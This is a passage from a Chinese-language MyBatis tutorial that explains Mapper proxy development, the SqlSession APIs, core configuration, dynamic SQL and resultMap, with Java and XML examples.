punctuation">&lt;</span>mapper</span> <span class="token attr-name">resource</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com\example\mapper\userMapper.xml<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mappers</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>编写测试代码</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//加载核心配置文件</span><span class="token class-name">InputStream</span> resourceAsStream <span class="token operator">=</span> <span class="token class-name">Resources</span><span class="token punctuation">.</span><span class="token function">getResourceAsStream</span><span class="token punctuation">(</span><span class="token string">"mybatis-config.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获得sqlSession工厂对象</span><span class="token class-name">SqlSessionFactory</span> sqlSessionFactory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SqlSessionFactoryBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span>resourceAsStream<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获得sqlSession对象</span><span class="token class-name">SqlSession</span> sqlSession <span class="token operator">=</span> sqlSessionFactory<span class="token punctuation">.</span><span class="token function">openSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//执行sql语句</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span>  userList <span class="token operator">=</span> sqlSession<span class="token punctuation">.</span><span class="token function">selectList</span><span class="token punctuation">(</span><span class="token string">"userMapper.selectAll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>userList<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//释放资源</span>sqlSession<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="Mapper-代理开发"><a href="#Mapper-代理开发" class="headerlink" title="Mapper 代理开发"></a>Mapper 代理开发</h2><p>采用 Mybatis 的代理开发方式实现 DAO 层的开发，这种方式是我们后面进入企业的主流。<br>Mapper 接口开发方法只需要程序员编写 Mapper 接口（相当于 Dao 接口），由 Mybatis 框架根据接口定义创建接<br>口的动态代理对象，代理对象的方法体同上边 Dao 接口实现类方法</p><h3 id="规范"><a href="#规范" class="headerlink" title="规范"></a>规范</h3><ul><li>定义与 SQL 映射文件同名的 Mapper 接口，并且将 Mapper 接口和 SQL 映射文件放置在同一目录下</li><li>设置 Mapper.xml 文件中的 namespace 为 mapper 接口的全限定名</li><li>在 Mapper 接口中定义方法，方法名就是 SQL 映射文件中 sql 语句的 id，并保持参数类型和返回值类型一致</li></ul><h3 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h3><ol><li><p>编写 Mapper 接口</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">UserMapper</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> <span class="token function">selectAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>编写 Mapper.xml</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mapper</span> <span class="token attr-name">namespace</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.example.mapper.UserMapper<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>selectAll<span class="token punctuation">"</span></span> <span class="token attr-name">resultType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        SELECT * FROM user;    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mapper</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>测试</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">InputStream</span> inputStream <span class="token operator">=</span> <span class="token class-name">Resources</span><span class="token punctuation">.</span><span class="token function">getResourceAsStream</span><span class="token punctuation">(</span><span class="token string">"mybatis-config.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">SqlSessionFactory</span> sqlSessionFactory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SqlSessionFactoryBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">SqlSession</span> sqlSession <span class="token operator">=</span> sqlSessionFactory<span class="token punctuation">.</span><span class="token function">openSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取Mapper对象</span>    <span class="token class-name">UserMapper</span> userMapper <span class="token operator">=</span> sqlSession<span class="token punctuation">.</span><span class="token function">getMapper</span><span class="token punctuation">(</span><span class="token class-name">UserMapper</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 使用Mapper调用对应的方法</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">></span></span> users <span class="token operator">=</span> userMapper<span class="token punctuation">.</span><span class="token function">selectAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>users<span class="token punctuation">)</span><span class="token punctuation">;</span>    sqlSession<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="相应-API"><a href="#相应-API" class="headerlink" title="相应 API"></a>相应 API</h2><h3 id="SqlSession-工厂构建器-SqlSessionFactoryBuilder"><a href="#SqlSession-工厂构建器-SqlSessionFactoryBuilder" class="headerlink" title="SqlSession 工厂构建器 SqlSessionFactoryBuilder"></a>SqlSession 工厂构建器 SqlSessionFactoryBuilder</h3><p>常用 API：SqlSessionFactory build(InputStream inputStream)<br>通过加载 mybatis 的核心文件的输入流的形式构建一个 SqlSessionFactory 对象</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> resource <span class="token operator">=</span> <span class="token string">"org/mybatis/builder/mybatis-config.xml"</span><span class="token punctuation">;</span><span class="token class-name">InputStream</span> inputStream <span class="token operator">=</span> <span class="token class-name">Resources</span><span class="token punctuation">.</span><span class="token function">getResourceAsStream</span><span class="token punctuation">(</span>resource<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">SqlSessionFactoryBuilder</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SqlSessionFactoryBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">SqlSessionFactory</span> factory <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其中， Resources 工具类，这个类在 org.apache.ibatis.io 包中。Resources 类帮助你从类路径下、文件系统或<br>一个 web URL 中加载资源文件。</p><h3 id="SqlSession-工厂对象-SqlSessionFactory"><a href="#SqlSession-工厂对象-SqlSessionFactory" class="headerlink" title="SqlSession 工厂对象 SqlSessionFactory"></a>SqlSession 工厂对象 SqlSessionFactory</h3><p>SqlSessionFactory 有多个个方法创建 SqlSession 实例。常用的有如下两个：</p><ul><li><p>openSession()</p><p>会默认开启一个事务，但事务不会自动提交 ，也就意味着需要手动提交该事务，更新操作数据才会持久化到数据库中</p></li><li><p>openSession(boolean autoCommit)</p><p>参数为是否自动提交，如果设置为 true，那么不需要手动提交事务</p></li></ul><h3 id="SqlSession-会话对象"><a href="#SqlSession-会话对象" class="headerlink" title="SqlSession 会话对象"></a>SqlSession 会话对象</h3><p>SqlSession 实例在 MyBatis 中是非常强大的一个类。在这里你会看到所有执行语句、提交或回滚事务和获取映射器实例的方法。<br>执行语句的方法主要有：</p><ul><li><code>&lt;T&gt; T selectOne(String statement, Object parameter)</code></li><li><code>&lt;E&gt; List&lt;E&gt; selectList(String statement, Object parameter)</code></li><li><code>int insert(String statement, Object parameter)</code></li><li><code>int update(String statement, Object parameter)</code></li><li><code>int delete(String statement, Object parameter)</code></li></ul><p>操作事务的方法：</p><ul><li><code>void commit()</code></li><li><code>void rollback()</code></li></ul><h2 id="核心配置文件"><a href="#核心配置文件" class="headerlink" title="核心配置文件"></a>核心配置文件</h2><ul><li><p>configuration 配置（按照层级关系）</p><ul><li><p>properties 属性</p><p>实际开发中，习惯将数据源的配置信息单独抽取成一个<code>properties</code>文件，该标签可以加载额外配置的<code>properties</code>文件</p></li><li><p>setting 设置</p></li><li><p>typeAliases 类型别名</p><p>为 java 类型设置一个短的名字，将全限定名定义别名为短限定名</p></li><li><p>typeHandlers 类型处理器</p></li><li><p>objectFactory 对象工厂</p></li><li><p>plugins 插件</p></li><li><p>environments 环境</p><ul><li>environment<ul><li>transactionManager 事务管理器<ol><li>JDBC：这个配置就是直接使用了 JDBC 的提交和回滚设置，它依赖于从数据源得到的连接来管理事务作用域。</li><li>MANAGED：这个配置几乎没做什么。它从来不提交或回滚一个连接，而是让容器来管理事务的整个生命周期（比如 JEE<br>应用服务器的上下文）。 默认情况下它会关闭连接，然而一些容器并不希望这样，因此需要将 closeConnection 属性设置<br>为 false 来阻止它默认的关闭行为。</li></ol></li><li>dataSource 数据源<ol><li>UNPOOLED：这个数据源的实现只是每次被请求时打开和关闭连接。</li><li>POOLED：这种数据源的实现利用“池”的概念将 JDBC 连接对象组织起来。</li><li>JNDI：这个数据源的实现是为了能在如 EJB 或应用服务器这类容器中使用，容器可以集中或在外部配置数据源，然后放置<br>一个 JNDI 上下文的引用。</li></ol></li></ul></li></ul></li><li><p>databaseIdProvider 数据库厂商标识</p></li><li><p>mappers 映射器</p><p>该标签的作用是加载映射的，加载方式有如下几种：<br>• 使用相对于类路径的资源引用，例如：<code>&lt;mapper resource=&quot;org/mybatis/builder/AuthorMapper.xml&quot;/&gt;</code><br>• 使用完全限定资源定位符（URL），例如：<code>&lt;mapper url=&quot;file:///var/mappers/AuthorMapper.xml&quot;/&gt;</code><br>• 使用映射器接口实现类的完全限定类名，例如：<code>&lt;mapper class=&quot;org.mybatis.builder.AuthorMapper&quot;/&gt;</code><br>• 将包内的映射器接口实现全部注册为映射器，例如：<code>&lt;package name=&quot;org.mybatis.builder&quot;/&gt;</code></p></li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">configuration</span> <span class="token name">PUBLIC</span> <span class="token string">"-//mybatis.org//DTD Config 3.0//EN"</span> <span class="token string">"http://mybatis.org/dtd/mybatis-3-config.dtd"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span> <span class="token attr-name">resource</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jdbc.properties<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>typeAliases</span><span class="token punctuation">></span></span>        <span class="token comment">&lt;!-- &lt;typeAlias type="com.example.pojo.User" alias="user" /> --></span>        <span class="token comment">&lt;!-- 包扫描 --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>package</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.example.pojo<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>typeAliases</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>environments</span> <span class="token attr-name">default</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>development<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>environment</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>development<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>transactionManager</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JDBC<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dataSource</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POOLED<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>driver<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;jdbc.driver&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;jdbc.url&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;jdbc.username&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;jdbc.password&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dataSource</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>environment</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>environments</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mappers</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>package</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.example.mapper<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mappers</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="映射文件"><a href="#映射文件" class="headerlink" title="映射文件"></a>映射文件</h2><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><ul><li><p><code>&lt;select&gt;</code></p></li><li><p><code>&lt;insert&gt;</code>：插入</p><p>返回添加数据的主键</p><p>​ <code>&lt;insert useGeneratedKeys=&quot;true&quot; keyProperty=&quot;id&quot;&gt;</code></p></li><li><p><code>&lt;update&gt;</code>：修改</p></li><li><p><code>&lt;delete&gt;</code>：删除</p></li></ul><h3 id="动态-SQL"><a href="#动态-SQL" class="headerlink" title="动态 SQL"></a>动态 SQL</h3><h4 id="lt-if-gt-：条件判断"><a href="#lt-if-gt-：条件判断" class="headerlink" title="&lt;if&gt;：条件判断"></a><code>&lt;if&gt;</code>：条件判断</h4><ul><li>test：条件表达式</li><li>当条件为空时，SQL 语句构造错误，可以选择<code>where 1 = 1</code>来解决，mybatis 提供了<code>&lt;where&gt;</code>来解决</li><li>单条件动态查询：从多个条件中选择一个</li><li>choose(when, otherwise) 类似于 java 中的 switch 语句</li><li>when：条件表达式</li><li>otherwise：条件不成立时的表达式</li></ul><p>我们根据实体类的不同取值，使用不同的 SQL 语句来进行查询。比如在 id 如果不为空时可以根据 id 查询，如果<br>username 不同空时还要加入用户名作为条件。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>findByCondition<span class="token punctuation">"</span></span> <span class="token attr-name">parameterType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token attr-name">resultType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    select * from User    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>where</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if</span> <span class="token attr-name">test</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id!=0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            and id=#&#123;id&#125;        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if</span> <span class="token attr-name">test</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username!=null<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            and username=#&#123;username&#125;        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>where</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="lt-foreach-gt-：用于遍历集合"><a href="#lt-foreach-gt-：用于遍历集合" class="headerlink" title="&lt;foreach&gt;：用于遍历集合"></a><code>&lt;foreach&gt;</code>：用于遍历集合</h4><ul><li>collection：代表要遍历的集合元素，注意编写时不要写#{}</li><li>open：代表语句的开始部分</li><li>close：代表结束部分</li><li>item：代表遍历集合的每个元素，生成的变量名</li><li>sperator：代表分隔符</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>selectByIds<span class="token punctuation">"</span></span> <span class="token attr-name">resultType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.example.pojo.User<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    select * from user    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>where</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foreach</span> <span class="token attr-name">collection</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>list<span class="token punctuation">"</span></span> <span class="token attr-name">open</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id in(<span class="token punctuation">"</span></span> <span class="token attr-name">close</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>)<span class="token punctuation">"</span></span> <span class="token attr-name">item</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token attr-name">separator</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>,<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            #&#123;id&#125;        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foreach</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>where</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="SQL-片段抽取"><a href="#SQL-片段抽取" class="headerlink" title="SQL 片段抽取"></a>SQL 片段抽取</h3><p>Sql 中可将重复的 sql 提取出来，使用时用 include 引用即可，最终达到 sql 重用的目的</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--抽取sql片段简化编写--></span>&lt;sql id="selectUser" select * from User<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sql</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>findById<span class="token punctuation">"</span></span> <span class="token attr-name">parameterType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>int<span class="token punctuation">"</span></span> <span class="token attr-name">resultType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>include</span> <span class="token attr-name">refid</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>selectUser<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span> where id=#&#123;id&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>findByIds<span class="token punctuation">"</span></span> <span class="token attr-name">parameterType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>list<span class="token punctuation">"</span></span> <span class="token attr-name">resultType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>include</span> <span class="token attr-name">refid</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>selectUser<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>where</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foreach</span> <span class="token attr-name">collection</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>array<span class="token punctuation">"</span></span> <span class="token attr-name">open</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id in(<span class="token punctuation">"</span></span> <span class="token attr-name">close</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>)<span class="token punctuation">"</span></span> <span class="token attr-name">item</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token attr-name">separator</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>,<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            #&#123;id&#125;        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foreach</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>where</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="自定义结果集"><a href="#自定义结果集" class="headerlink" title="自定义结果集"></a>自定义结果集</h3><p><code>&lt;resultMap&gt;</code>：</p><ul><li>id：唯一标识</li><li>type：映射的类型，支持别名</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resultMap</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userMap<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>uid<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>collection</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>orderList<span class="token punctuation">"</span></span> <span class="token attr-name">ofType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>order<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>orderTime<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token 